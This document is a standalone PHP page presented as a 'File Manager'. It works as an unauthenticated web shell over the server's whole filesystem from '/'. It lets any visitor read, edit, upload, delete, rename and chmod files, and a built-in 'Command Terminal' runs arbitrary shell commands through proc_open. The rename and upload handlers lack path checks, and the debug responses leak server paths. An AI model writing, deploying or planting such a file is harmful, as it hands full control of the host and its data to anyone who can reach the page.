<?php

// Set the root directory to the server's root
$root_directory = '/';

// Get the current directory from the URL parameter
$current_directory = isset($_GET['dir']) ? $_GET['dir'] : '';

// Generate a unique visit_id for each page load
$visit_id = uniqid();

// Construct the full path
$full_path = realpath($root_directory . $current_directory);

// Security check: Ensure the path is within the allowed root
if ($full_path === false || strpos($full_path, realpath($root_directory)) !== 0) {
    $full_path = $root_directory;
    $current_directory = '';
}


// Ensure $full_path ends with a directory separator
$full_path = rtrim($full_path, '/\\') . DIRECTORY_SEPARATOR;

function getPathParts($path) {
    $parts = explode('/', trim($path, '/'));
    $pathParts = [['name' => 'Root', 'path' => '/', 'visit_id' => uniqid()]];
    $currentPath = '';
    foreach ($parts as $part) {
        if ($part !== '') {
            $currentPath .= $part . '/';
            $pathParts[] = [
                'name' => $part,
                'path' => $currentPath,
                'visit_id' => uniqid()
            ];
        }
    }
    return $pathParts;
}

$pathParts = getPathParts($current_directory);

// Get the list of files and directories in the current directory
$files = scandir($full_path);

// AJAX request handling
if (isset($_POST['action']) && isset($_POST['file'])) {
    $action = $_POST['action'];
    $file = trim($_POST['file'], '/\\');
    $filePath = realpath($full_path . $file);

    $response = ['success' => false, 'message' => '', 'debug' => []];
    $response['debug']['base_directory'] = $root_directory;
    $response['debug']['current_directory'] = $current_directory;
    $response['debug']['file'] = $file;
    $response['debug']['directory'] = $full_path;
    $response['debug']['file_path'] = $filePath;

    // Ensure the file path is within the allowed directory
    if ($filePath === false || strpos($filePath, realpath($root_directory)) !== 0) {
        $response['message'] = 'Invalid file path';
        echo json_encode($response);
        exit;
    }

    switch ($action) {
        case 'edit':
            if (file_exists($filePath) && is_file($filePath)) {
                if (isset($_POST['content'])) {
                    $writeResult = file_put_contents($filePath, $_POST['content']);
                    if ($writeResult !== false) {
                        $response['success'] = true;
                        $response['message'] = "File updated successfully.";
                    } else {
                        $response['message'] = "Failed to update the file. Check permissions.";
                        $response['debug']['error'] = error_get_last();
                    }
                } else {
                    $content = file_get_contents($filePath);
                    if ($content !== false) {
                        $response['success'] = true;
                        $response['content'] = $content;
                    } else {
                        $response['message'] = "Failed to read the file. Check permissions.";
                        $response['debug']['error'] = error_get_last();
                    }
                }
            } else {
                $response['message'] = "File not found or is not a regular file.";
            }
            break;
        case 'delete':
            $file = trim($_POST['file'], '/\\');
            $filePath = realpath($full_path . $file);

            // Ensure the file path is within the allowed directory
            if ($filePath === false || strpos($filePath, realpath($root_directory)) !== 0) {
                $response['message'] = 'Invalid file path';
                echo json_encode($response);
                exit;
            }

            if (file_exists($filePath)) {
                if (is_file($filePath)) {
                    if (unlink($filePath)) {
                        $response['success'] = true;
                        $response['message'] = "File deleted successfully.";
                    } else {
                        $response['message'] = "Failed to delete the file.";
                    }
                } elseif (is_dir($filePath)) {
                    if (rmdir($filePath)) {
                        $response['success'] = true;
                        $response['message'] = "Directory deleted successfully.";
                    } else {
                        $response['message'] = "Failed to delete the directory. It might not be empty.";
                    }
                } else {
                    $response['message'] = "The item is neither a file nor a directory.";
                }
            } else {
                $response['message'] = "File or directory not found.";
            }
            break;
            case 'chmod':
                if (isset($_POST['file']) && isset($_POST['permissions'])) {
                    $file = trim($_POST['file'], '/\\');
                    $current_directory = isset($_POST['dir']) ? trim($_POST['dir'], '/\\') : '';
                    
                    $response = ['success' => false, 'message' => '', 'debug' => []];
                    
                    // Adjust the root directory
                    $root_directory = '/';  // This should be the actual root of your web server
                    
                    // Construct the full path correctly
                    $full_path = $root_directory . str_replace('\\', '/', $current_directory);
                    $full_path = rtrim($full_path, '/') . '/';
                    $filePath = $full_path . $file;
                    
                    $response['debug'] = [
                        'root_directory' => $root_directory,
                        'current_directory' => $current_directory,
                        'file' => $file,
                        'full_path' => $full_path,
                        'file_path' => $filePath,
                        'file_exists' => file_exists($filePath),
                        'is_readable' => is_readable($filePath),
                        'is_writable' => is_writable($filePath)
                    ];
            
                    // Ensure the file path is within the allowed directory
                    if (!file_exists($filePath) || strpos($filePath, $root_directory) !== 0) {
                        $response['message'] = 'Invalid file path';
                        echo json_encode($response);
                        exit;
                    }
            
                    if (file_exists($filePath)) {
                        $permissions = octdec($_POST['permissions']);
                        if (@chmod($filePath, $permissions)) {
                            $response['success'] = true;
                            $response['message'] = "Permissions changed successfully.";
                            $response['newPermissions'] = getFilePermissions($filePath);
                        } else {
                            $response['success'] = false;
                            $response['message'] = "Failed to change permissions.";
                            $response['debug']['error'] = error_get_last();
                        }
                    } else {
                        $response['message'] = "File or directory not found.";
                    }
                } else {
                    $response['message'] = "Missing file or permissions parameter.";
                }
                break;
        case 'rename':
            if (file_exists($filePath)) {
                $newName = isset($_POST['newName']) ? $_POST['newName'] : '';
                $newPath = $full_path . $newName;
                if (!empty($newName) && $newName !== $file) {
                    if (!file_exists($newPath)) {
                        if (rename($filePath, $newPath)) {
                            $response['success'] = true;
                            $response['message'] = "File renamed successfully.";
                            $response['newName'] = $newName;
                        } else {
                            $response['message'] = "Failed to rename the file.";
                        }
                    } else {
                        $response['message'] = "A file with that name already exists.";
                    }
                } else {
                    $response['message'] = "Invalid new name provided.";
                }
            } else {
                $response['message'] = "File not found.";
            }
            break;
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// Handle file download
if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['file'])) {
    $file = $_GET['file'];
    $filePath = realpath($full_path . $file);

    // Check if the file exists and is within the allowed directory
    if ($filePath && is_file($filePath) && strpos($filePath, realpath($root_directory)) === 0) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    } else {
        die("File not found or access denied.");
    }
}

function formatFileSize($file) {
    if (!file_exists($file) || !is_readable($file)) {
        return 'N/A';
    }
    
    $size = @filesize($file);
    if ($size === false) {
        return 'N/A';
    }
    
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $size = max($size, 0);
    $pow = floor(($size ? log($size) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $size /= (1 << (10 * $pow));
    return round($size, 2) . ' ' . $units[$pow];
}

function getFilePermissions($file) {
    if (!file_exists($file)) {
        return 'N/A';
    }
    
    $perms = fileperms($file);
    
    // Get the numeric permissions
    $numericPerms = substr(sprintf('%o', $perms), -4);
    
    switch ($perms & 0xF000) {
        case 0xC000: // socket
            $info = 's';
            break;
        case 0xA000: // symbolic link
            $info = 'l';
            break;
        case 0x8000: // regular
            $info = '-';
            break;
        case 0x6000: // block special
            $info = 'b';
            break;
        case 0x4000: // directory
            $info = 'd';
            break;
        case 0x2000: // character special
            $info = 'c';
            break;
        case 0x1000: // FIFO pipe
            $info = 'p';
            break;
        default: // unknown
            $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));

    // Return both numeric and symbolic permissions
    return $numericPerms . ' (' . $info . ')';
}

// Add this near the top of your PHP code, with other action handlers
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'execute_command') {
    $command = isset($_POST['command']) ? $_POST['command'] : '';
    $output = '';
    $error = '';

    if (!empty($command)) {
        // Check if we're on Windows
        $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

        // Replace common Unix commands with Windows equivalents
        if ($isWindows) {
            $command = str_replace('ls', 'dir', $command);
            $command = str_replace('rm', 'del', $command);
            $command = str_replace('mv', 'move', $command);
            $command = str_replace('cp', 'copy', $command);
            $command = str_replace('cat', 'type', $command);
            // Add more replacements as needed
        }

        // Use 'cmd /c' on Windows, '/bin/sh -c' on Unix
        $prefix = $isWindows ? 'cmd /c ' : '/bin/sh -c ';
        $command = $prefix . escapeshellcmd($command);

        $descriptorspec = array(
           0 => array("pipe", "r"),  // stdin
           1 => array("pipe", "w"),  // stdout
           2 => array("pipe", "w")   // stderr
        );

        $process = proc_open($command, $descriptorspec, $pipes, $full_path);

        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            proc_close($process);
        }
    }

    echo json_encode(['output' => $output, 'error' => $error]);
    exit;
}

// Add this new section to handle file uploads, file creation, and folder creation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        $response = ['success' => false, 'message' => ''];

        switch ($_POST['action']) {
            case 'upload':
                if (!empty($_FILES['files']['name'][0])) {
                    $uploadedFiles = [];
                    $failedUploads = [];

                    foreach ($_FILES['files']['name'] as $key => $name) {
                        $tmpName = $_FILES['files']['tmp_name'][$key];
                        $targetPath = $full_path . $name;

                        if (move_uploaded_file($tmpName, $targetPath)) {
                            $uploadedFiles[] = $name;
                        } else {
                            $failedUploads[] = $name;
                        }
                    }

                    if (!empty($uploadedFiles)) {
                        $response['success'] = true;
                        $response['message'] = "Successfully uploaded: " . implode(', ', $uploadedFiles);
                    }
                    if (!empty($failedUploads)) {
                        $response['message'] .= " Failed to upload: " . implode(', ', $failedUploads);
                    }
                } else {
                    $response['message'] = "No files were uploaded.";
                }
                break;

            case 'create_file':
                $newFileName = isset($_POST['file_name']) ? trim($_POST['file_name']) : '';
                if (!empty($newFileName)) {
                    $newFilePath = $full_path . $newFileName;
                    if (!file_exists($newFilePath)) {
                        if (touch($newFilePath)) {
                            $response['success'] = true;
                            $response['message'] = "File '$newFileName' created successfully.";
                        } else {
                            $response['message'] = "Failed to create file '$newFileName'.";
                        }
                    } else {
                        $response['message'] = "File '$newFileName' already exists.";
                    }
                } else {
                    $response['message'] = "File name is required.";
                }
                break;

            case 'create_folder':
                $newFolderName = isset($_POST['folder_name']) ? trim($_POST['folder_name']) : '';
                if (!empty($newFolderName)) {
                    $newFolderPath = $full_path . $newFolderName;
                    if (!file_exists($newFolderPath)) {
                        if (mkdir($newFolderPath)) {
                            $response['success'] = true;
                            $response['message'] = "Folder '$newFolderName' created successfully.";
                        } else {
                            $response['message'] = "Failed to create folder '$newFolderName'.";
                        }
                    } else {
                        $response['message'] = "Folder '$newFolderName' already exists.";
                    }
                } else {
                    $response['message'] = "Folder name is required.";
                }
                break;
        }

        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }
}

function getFileIcon($file) {
    $extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    switch ($extension) {
        case 'jpg':
        case 'jpeg':
        case 'png':
        case 'gif':
        case 'bmp':
            return '<i class="fas fa-file-image"></i>';
        case 'pdf':
            return '<i class="fas fa-file-pdf"></i>';
        case 'doc':
        case 'docx':
            return '<i class="fas fa-file-word"></i>';
        case 'xls':
        case 'xlsx':
            return '<i class="fas fa-file-excel"></i>';
        case 'ppt':
        case 'pptx':
            return '<i class="fas fa-file-powerpoint"></i>';
        case 'zip':
        case 'rar':
        case '7z':
            return '<i class="fas fa-file-archive"></i>';
        case 'txt':
            return '<i class="fas fa-file-alt"></i>';
        case 'php':
        case 'js':
        case 'css':
        case 'html':
            return '<i class="fas fa-file-code"></i>';
        default:
            return '<i class="fas fa-file text-secondary"></i>';
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        .table-responsive {
            max-height: 80vh;
            overflow-y: auto;
        }
        #sidebar {
            position: fixed;
            top: 0;
            right: -100%;
            width: 100%;
            height: 100%;
            background-color: #f8f9fa;
            transition: 0.3s;
            overflow-y: auto;
            z-index: 1000;
            padding: 20px;
            box-shadow: -2px 0 5px rgba(0,0,0,0.1);
            resize: horizontal;
            overflow: auto;
        }
        #sidebar.active {
            right: 0;
        }
        #sidebarToggle {
            position: fixed;
            top: 10px;
            right: 10px;
            z-index: 1001;
        }
        .main-content {
            transition: margin-right 0.3s;
        }
        @media (min-width: 768px) {
            #sidebar {
                width: 300px;
                right: -300px;
            }
            .main-content.active {
                margin-right: 300px;
            }
        }
        #sidebarResizeHandle {
            width: 5px;
            height: 100%;
            background: #ccc;
            position: absolute;
            left: 0;
            top: 0;
            cursor: ew-resize;
        }
        @media (max-width: 767px) {
            #sidebar {
                resize: none;
            }
            #sidebarResizeHandle {
                display: none;
            }
        }
    </style>
</head>
<body class="bg-light">
    <button id="sidebarToggle" class="btn btn-primary">
        <i class="fas fa-bars"></i>
    </button>

    <div id="sidebar">
        <div id="sidebarResizeHandle"></div>
        <h3>File Operations</h3>
        <div class="action-buttons">
            <form id="uploadForm" enctype="multipart/form-data">
                <div class="mb-3">
                    <label for="fileUpload" class="form-label">Upload Files</label>
                    <input type="file" class="form-control" id="fileUpload" name="files[]" multiple>
                </div>
                <button type="submit" class="btn btn-primary">Upload</button>
            </form>
            <hr>
            <form id="createFileForm">
                <div class="mb-3">
                    <label for="fileName" class="form-label">Create File</label>
                    <input type="text" class="form-control" id="fileName" name="file_name" placeholder="Enter file name">
                </div>
                <button type="submit" class="btn btn-success">Create File</button>
            </form>
            <hr>
            <form id="createFolderForm">
                <div class="mb-3">
                    <label for="folderName" class="form-label">Create Folder</label>
                    <input type="text" class="form-control" id="folderName" name="folder_name" placeholder="Enter folder name">
                </div>
                <button type="submit" class="btn btn-info">Create Folder</button>
            </form>
            <hr>
            <h4>Command Terminal</h4>
            <div class="mb-3">
                <small class="text-muted">
                    Available commands: ls/dir, rm/del, mv/move, cp/copy, cat/type
                </small>
                <input type="text" class="form-control" id="commandInput" placeholder="Enter command">
            </div>
            <button id="executeCommand" class="btn btn-warning">Execute</button>
        </div>
    </div>

    <div class="main-content">
        <div class="container-fluid mt-5">
            <div class="row justify-content-center">
                <div class="col-md-10">
                    <div class="card shadow">
                        <div class="card-header bg-primary text-white">
                            <h2 class="mb-0">File Manager</h2>
                        </div>
                        <div class="card-body">
                            <div class="mb-3">
                                <strong>PWD: </strong>
                                <?php foreach ($pathParts as $index => $part): ?>
                                    <a href="?dir=<?php echo urlencode(rtrim($part['path'], '/')); ?>&visit_id=<?php echo $part['visit_id']; ?>" class="btn btn-sm btn-outline-secondary">
                                        <?php echo htmlspecialchars($part['name']); ?>
                                    </a>
                                    <?php if ($index < count($pathParts) - 1): ?>
                                        <span class="mx-1">/</span>
                                    <?php endif; ?>
                                <?php endforeach; ?>
                            </div>
                            <div id="message-container"></div>
                            <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead class="table-light">
                                        <tr>
                                            <th>Name</th>
                                            <th>Size</th>
                                            <th>Permissions</th>
                                            <th>Last Modified</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php foreach ($files as $file): ?>
                                            <?php if ($file != "." && $file != ".."): ?>
                                                <?php
                                                $filePath = $full_path . $file;$isDir = is_dir($filePath);$fileSize = $isDir ? '-' : formatFileSize($filePath);
                                                $filePerms = getFilePermissions($filePath);
                                                $fileModified = @filemtime($filePath);
                                                $fileModified = $fileModified !== false ? date("Y-m-d H:i:s", $fileModified) : 'N/A';
                                                ?>
                                                <tr data-file="<?php echo htmlspecialchars($file); ?>">
                                                    <td>
                                                        <?php if ($isDir): ?>
                                                            <i class="fas fa-folder text-warning"></i>
                                                            <a href="?dir=<?php echo urlencode(trim($current_directory . '/' . $file, '/')); ?>&visit_id=<?php echo $visit_id; ?>">
                                                                <?php echo htmlspecialchars($file); ?>
                                                            </a>
                                                        <?php else: ?>
                                                            <?php echo getFileIcon($file); ?>
                                                            <?php echo htmlspecialchars($file); ?>
                                                        <?php endif; ?>
                                                    </td>
                                                    <td><?php echo $fileSize; ?></td>
                                                    <td><?php echo $filePerms; ?></td>
                                                    <td><?php echo $fileModified; ?></td>
                                                    <td>
                                                        <div class="btn-group" role="group">
                                                            <?php if (!$isDir): ?>
                                                                <button class="btn btn-sm btn-outline-primary edit-btn" title="Edit"><i class="fas fa-edit"></i></button>
                                                            <?php endif; ?>
                                                            <button class="btn btn-sm btn-outline-danger delete-btn" title="Delete"><i class="fas fa-trash-alt"></i></button>
                                                            <button class="btn btn-sm btn-outline-warning chmod-btn" title="Change Permissions"><i class="fas fa-key"></i></button>
                                                            <button class="btn btn-sm btn-outline-info rename-btn" title="Rename"><i class="fas fa-pencil-alt"></i></button>
                                                            <?php if (!$isDir): ?>
                                                                <a href="?action=download&dir=<?php echo urlencode($current_directory); ?>&file=<?php echo urlencode($file); ?>" class="btn btn-sm btn-outline-success" title="Download"><i class="fas fa-download"></i></a>
                                                            <?php endif; ?>
                                                        </div>
                                                    </td>
                                                </tr>
                                            <?php endif; ?>
                                        <?php endforeach; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Add this modal for editing files -->
    <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="editModalLabel">Edit File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <textarea id="fileContent" class="form-control" rows="20"></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="saveChanges">Save changes</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Command Output Modal -->
    <div class="modal fade" id="commandOutputModal" tabindex="-1" aria-labelledby="commandOutputModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title" id="commandOutputModalLabel">Command Output</h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <pre id="modalCommandOutput" class="bg-dark text-light p-3" style="max-height: 400px; overflow-y: auto;"></pre>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            function updateNavigationHistory(dir, visitId) {
                let history = JSON.parse(localStorage.getItem('navHistory') || '[]');
                history.push({ dir, visitId });
                localStorage.setItem('navHistory', JSON.stringify(history));
            }

            // Update history when page loads
            let currentDir = new URLSearchParams(window.location.search).get('dir') || '';
            let visitId = new URLSearchParams(window.location.search).get('visit_id');
            if (visitId) {
                let history = JSON.parse(localStorage.getItem('navHistory') || '[]');
                if (history.length === 0 || history[history.length - 1].visitId !== visitId) {
                    updateNavigationHistory(currentDir, visitId);
                }
            }

            // Intercept directory clicks
            $('a[href^="?dir="]').click(function(e) {
                e.preventDefault();
                let href = $(this).attr('href');
                let dir = new URLSearchParams(href).get('dir');
                let visitId = new URLSearchParams(href).get('visit_id');
                updateNavigationHistory(dir, visitId);
                window.location.href = href;
            });

            function showMessage(message, type, debug = null) {
                let debugInfo = '';
                if (debug) {
                    debugInfo = '<pre>' + JSON.stringify(debug, null, 2) + '</pre>';
                }
                $('#message-container').html(`<div class="alert alert-${type} alert-dismissible fade show" role="alert">
                    ${message}
                    ${debugInfo}
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                </div>`);
            }

            function getFullPath(file) {
                const currentDir = getCurrentDirectory();
                return (currentDir ? currentDir + '/' : '') + file;
            }

            function renameFile(file) {
                const newName = prompt(`Enter new name for "${file}":`, file);
                if (newName && newName !== file) {
                    const currentDir = getCurrentDirectory();
                    $.post('', { action: 'rename', file: getFullPath(file), newName: newName, dir: currentDir }, function(response) {
                        if (response.success) {
                            showMessage(response.message, 'success');
                            // Update the file name in the table
                            const $row = $(`tr[data-file="${file}"]`);
                            $row.attr('data-file', response.newName);
                            $row.find('td:first').text(response.newName);
                        } else {
                            showMessage(response.message, 'danger');
                        }
                    });
                }
            }

            $('.rename-btn').click(function() {
                const file = $(this).closest('tr').data('file');
                renameFile(file);
            });

            $('.delete-btn').click(function() {
                const file = $(this).closest('tr').data('file');
                const currentDir = getCurrentDirectory();
                if (confirm(`Are you sure you want to delete "${file}"?`)) {
                    $.ajax({
                        url: '',
                        method: 'POST',
                        data: { 
                            action: 'delete', 
                            file: file,
                            dir: currentDir
                        },
                        dataType: 'json',
                        success: function(response) {
                            if (response.success) {
                                $(`tr[data-file="${file}"]`).remove();
                                showMessage(response.message, 'success');
                            } else {
                                showMessage(response.message, 'danger');
                            }
                        },
                        error: function(jqXHR, textStatus, errorThrown) {
                            showMessage('An error occurred while deleting the file: ' + textStatus, 'danger');
                        }
                    });
                }
            });

            $('.chmod-btn').click(function() {
                const file = $(this).closest('tr').data('file');
                const currentDir = getCurrentDirectory();
                const permissions = prompt(`Enter new permissions for "${file}" (e.g., 0644):`);
                if (permissions) {
                    $.ajax({
                        url: '',
                        method: 'POST',
                        data: { 
                            action: 'chmod', 
                            file: file,
                            dir: currentDir, 
                            permissions: permissions 
                        },
                        dataType: 'json',
                        success: function(response) {
                            if (response.success) {
                                showMessage(response.message, 'success');
                                // Update the permissions display
                                if (response.newPermissions) {
                                    $(`tr[data-file="${file}"] td:nth-child(3)`).text(response.newPermissions);
                                }
                            } else {
                                showMessage(response.message || 'An error occurred while changing permissions.', 'danger', response.debug);
                            }
                        },
                        error: function(jqXHR, textStatus, errorThrown) {
                            showMessage('An error occurred: ' + textStatus, 'danger', {error: errorThrown});
                        }
                    });
                }
            });

            $('.edit-btn').click(function() {
                const file = $(this).closest('tr').data('file');
                $.ajax({
                    url: '',
                    method: 'POST',
                    data: { action: 'edit', file: file, dir: getCurrentDirectory() },
                    dataType: 'json',
                    success: function(response) {
                        if (response.success) {
                            $('#fileContent').val(response.content);
                            $('#editModalLabel').text('Edit File: ' + file);
                            $('#saveChanges').data('file', file);
                            $('#editModal').modal('show');
                        } else {
                            showMessage(response.message, 'danger', response.debug);
                        }
                    },
                    error: function(jqXHR, textStatus, errorThrown) {
                        showMessage('An error occurred while fetching the file content: ' + textStatus, 'danger', {error: errorThrown});
                    }
                });
            });

            $('#saveChanges').click(function() {
                const file = $(this).data('file');
                const content = $('#fileContent').val();
                $.ajax({
                    url: '',
                    method: 'POST',
                    data: { action: 'edit', file: file, dir: getCurrentDirectory(), content: content },
                    dataType: 'json',
                    success: function(response) {
                        if (response.success) {
                            showMessage(response.message, 'success');
                            $('#editModal').modal('hide');
                        } else {
                            showMessage(response.message, 'danger', response.debug);
                        }
                    },
                    error: function(jqXHR, textStatus, errorThrown) {
                        showMessage('An error occurred while saving the file content: ' + textStatus, 'danger', {error: errorThrown});
                    }
                });
            });

            function getCurrentDirectory() {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get('dir') || '';
            }

            // Sidebar toggle
            $('#sidebarToggle').click(function() {
                $('#sidebar').toggleClass('active');
                if ($('#sidebar').hasClass('active')) {
                    $('.main-content').css('margin-right', $('#sidebar').width() + 'px');
                } else {
                    $('.main-content').css('margin-right', '');
                }
            });

            // Close sidebar when clicking outside on mobile
            $(document).on('click touchstart', function(e) {
                if (window.innerWidth <= 767 && $('#sidebar').hasClass('active') && !$(e.target).closest('#sidebar, #sidebarToggle').length) {
                    $('#sidebar').removeClass('active');
                    $('.main-content').css('margin-right', '');
                }
            });

            // File upload
            $('#uploadForm').submit(function(e) {
                e.preventDefault();
                var formData = new FormData(this);
                formData.append('action', 'upload');
                formData.append('dir', getCurrentDirectory());

                $.ajax({
                    url: '',
                    type: 'POST',
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function(response) {
                        showMessage(response.message, response.success ? 'success' : 'danger');
                        if (response.success) {
                            location.reload();
                        }
                    },
                    error: function() {
                        showMessage('An error occurred during file upload.', 'danger');
                    }
                });});

            // Create file
            $('#createFileForm').submit(function(e) {
                e.preventDefault();
                var fileName = $('#fileName').val();
                $.post('', {
                    action: 'create_file',
                    file_name: fileName,
                    dir: getCurrentDirectory()
                }, function(response) {
                    showMessage(response.message, response.success ? 'success' : 'danger');
                    if (response.success) {
                        location.reload();
                    }
                });
            });

            // Create folder
            $('#createFolderForm').submit(function(e) {
                e.preventDefault();
                var folderName = $('#folderName').val();
                $.post('', {
                    action: 'create_folder',
                    folder_name: folderName,
                    dir: getCurrentDirectory()
                }, function(response) {
                    showMessage(response.message, response.success ? 'success' : 'danger');
                    if (response.success) {
                        location.reload();
                    }
                });
            });

            // Command terminal
            $('#executeCommand').click(function() {
                const command = $('#commandInput').val();
                if (command) {
                    $.ajax({
                        url: '',
                        method: 'POST',
                        data: {
                            action: 'execute_command',
                            command: command,
                            dir: getCurrentDirectory()
                        },
                        dataType: 'json',
                        success: function(response) {
                            let output = response.output || '';
                            if (response.error) {
                                output += '\nError: ' + response.error;
                            }
                            output = escapeHtml(output);
                            output = output.replace(/\n/g, '<br>');
                            
                            // Update modal content
                            $('#modalCommandOutput').html('<strong>> ' + escapeHtml(command) + '</strong><br><br>' + output);
                            
                            // Show the modal
                            var commandOutputModal = new bootstrap.Modal(document.getElementById('commandOutputModal'));
                            commandOutputModal.show();
                            
                            // Clear the input
                            $('#commandInput').val('');
                        },
                        error: function(jqXHR, textStatus, errorThrown) {
                            showMessage('An error occurred while executing the command: ' + textStatus, 'danger');
                        }
                    });
                }
            });

            // Allow executing commands with Enter key
            $('#commandInput').keypress(function(e) {
                if (e.which == 13) {
                    $('#executeCommand').click();
                    return false;
                }
            });

            let isResizing = false;
            let lastDownX = 0;
            let originalWidth = 300; // Default width of sidebar

            $('#sidebarResizeHandle').mousedown(function(e) {
                isResizing = true;
                lastDownX = e.clientX;
                originalWidth = $('#sidebar').width();
                $('body').css('user-select', 'none'); // Prevent text selection while resizing
            });

            $(document).mousemove(function(e) {
                if (!isResizing) return;

                let difference = lastDownX - e.clientX;
                let newWidth = originalWidth + difference;

                // Set minimum and maximum widths
                newWidth = Math.max(200, Math.min(newWidth, window.innerWidth - 50));

                $('#sidebar').css('width', newWidth + 'px');
                $('.main-content').css('margin-right', newWidth + 'px');
            });

            $(document).mouseup(function() {
                isResizing = false;
                $('body').css('user-select', '');
            });

            // Adjust main content on window resize
            $(window).resize(function() {
                if (window.innerWidth <= 767) {
                    $('.main-content').css('margin-right', '');
                } else if ($('#sidebar').hasClass('active')) {
                    $('.main-content').css('margin-right', $('#sidebar').width() + 'px');
                }
            });

            // Highlight: Added this function to escape HTML
            function escapeHtml(unsafe) {
                return unsafe
                     .replace(/&/g, "&amp;")
                     .replace(/</g, "&lt;")
                     .replace(/>/g, "&gt;")
                     .replace(/"/g, "&quot;")
                     .replace(/'/g, "&#039;");
            }
        });
    </script>
</body>
</html>
